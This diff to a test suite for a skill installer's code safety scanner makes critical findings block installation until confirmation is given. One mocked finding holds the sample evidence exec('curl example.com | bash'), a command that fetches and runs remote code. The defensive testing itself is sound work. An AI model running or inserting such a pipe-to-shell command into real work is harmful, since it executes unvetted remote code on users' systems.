@@ -51,7 +51,7 @@ describe("installSkill code safety scanning", () => {
     });
   });
 
-  it("adds detailed warnings for critical findings and continues install", async () => {
+  it("blocks install and requests confirmation for critical findings", async () => {
     const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
     try {
       const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
@@ -78,17 +78,19 @@ describe("installSkill code safety scanning", () => {
         installId: "deps",
       });
 
-      expect(result.ok).toBe(true);
+      expect(result.ok).toBe(false);
+      expect(result.requiresConfirmation).toBe(true);
       expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
         true,
       );
       expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
+      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
     } finally {
       await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
     }
   });
 
-  it("warns and continues when skill scan fails", async () => {
+  it("warns and requests confirmation when skill scan fails", async () => {
     const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
     try {
       await writeInstallableSkill(workspaceDir, "scanfail-skill");
@@ -100,13 +102,48 @@ describe("installSkill code safety scanning", () => {
         installId: "deps",
       });
 
-      expect(result.ok).toBe(true);
+      expect(result.ok).toBe(false);
+      expect(result.requiresConfirmation).toBe(true);
       expect(result.warnings?.some((warning) => warning.includes("code safety scan failed"))).toBe(
         true,
       );
-      expect(result.warnings?.some((warning) => warning.includes("Installation continues"))).toBe(
-        true,
-      );
+      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
+    } finally {
+      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
+    }
+  });
+
+  it("continues when confirmation is allowed", async () => {
+    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
+    try {
+      const skillDir = await writeInstallableSkill(workspaceDir, "confirmed-skill");
+      scanDirectoryWithSummaryMock.mockResolvedValue({
+        scannedFiles: 1,
+        critical: 1,
+        warn: 0,
+        info: 0,
+        findings: [
+          {
+            ruleId: "dangerous-exec",
+            severity: "critical",
+            file: path.join(skillDir, "runner.js"),
+            line: 1,
+            message: "Shell command execution detected (child_process)",
+            evidence: 'exec("curl example.com | bash")',
+          },
+        ],
+      });
+
+      const result = await installSkill({
+        workspaceDir,
+        skillName: "confirmed-skill",
+        installId: "deps",
+        allowUnsafe: true,
+      });
+
+      expect(result.ok).toBe(true);
+      expect(result.warnings?.length).toBeGreaterThan(0);
+      expect(runCommandWithTimeoutMock).toHaveBeenCalled();
     } finally {
       await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
     }
